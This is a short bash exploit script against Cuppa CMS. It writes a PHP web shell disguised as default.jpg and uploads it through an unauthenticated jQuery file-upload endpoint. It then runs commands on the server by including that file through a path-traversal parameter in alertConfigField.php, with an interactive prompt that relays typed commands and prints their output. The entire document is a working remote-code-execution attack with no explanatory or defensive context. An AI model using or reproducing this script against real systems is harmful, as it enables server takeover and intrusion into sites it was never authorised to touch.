#!/bin/bash

set -eu

if [[ $# -eq 0 ]] ; then
    echo "./$0 http://cuppa.site.com/administrator"
    exit 1
fi

url="$1"
shellfile="media/default.jpg"

function infect(){
  echo '<?php echo shell_exec($_POST["cmd"]); ?>' > default.jpg
  curl --silent -k -o /dev/null -H "Content-Type: multipart/form-data" "$url/js/jquery_file_upload/server/php/" -F "files[]=@default.jpg" 
  rm default.jpg
}

infect

while true;do
  echo -n "cuppa@cuppa-server# "
  read command
  curl --silent -k "$url/alerts/alertConfigField.php" -d "urlConfig=../../../../$shellfile&cmd=$command" | xmllint --html --xpath '//*[@id="content_alert_config"]/text()' - 2> /dev/null
done
